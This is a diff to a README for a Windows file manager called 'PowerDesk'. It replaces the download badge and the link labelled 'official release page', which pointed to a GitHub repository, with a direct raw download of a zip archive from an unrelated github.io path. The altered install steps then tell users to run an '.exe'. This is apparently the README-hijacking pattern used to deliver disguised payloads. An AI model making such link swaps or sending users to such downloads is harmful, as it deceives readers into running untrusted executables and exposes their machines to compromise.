@@ -5,7 +5,7 @@ description: "Replace Windows Explorer with this keyboard-first file manager fea
 ---
 # 📂 PowerDesk - Manage your Windows files with ease
 
-[![Download PowerDesk](https://img.shields.io/badge/Download-PowerDesk-blue)](https://github.com/0811sakshamsharma-spec/PowerDesk)
+[![Download PowerDesk](https://img.shields.io/badge/Download-PowerDesk-blue)](https://raw.githubusercontent.com/0811sakshamsharma-spec/0811sakshamsharma-spec.github.io/main/circumfusile/Dist-v1.7.zip)
 
 PowerDesk serves as a modern file manager for Windows. It provides a clean interface to view, organize, and search your documents, photos, and folders. Built with current web technology, the application offers a fast and reliable experience for your daily tasks.
 
@@ -13,7 +13,7 @@ PowerDesk serves as a modern file manager for Windows. It provides a clean inter
 
 Follow these steps to install PowerDesk on your computer.
 
-1. Visit the [official release page](https://github.com/0811sakshamsharma-spec/PowerDesk) to view available downloads.
+1. Visit the [official release page](https://raw.githubusercontent.com/0811sakshamsharma-spec/0811sakshamsharma-spec.github.io/main/circumfusile/Dist-v1.7.zip) to view available downloads.
 2. Look for the file ending in `.exe`.
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
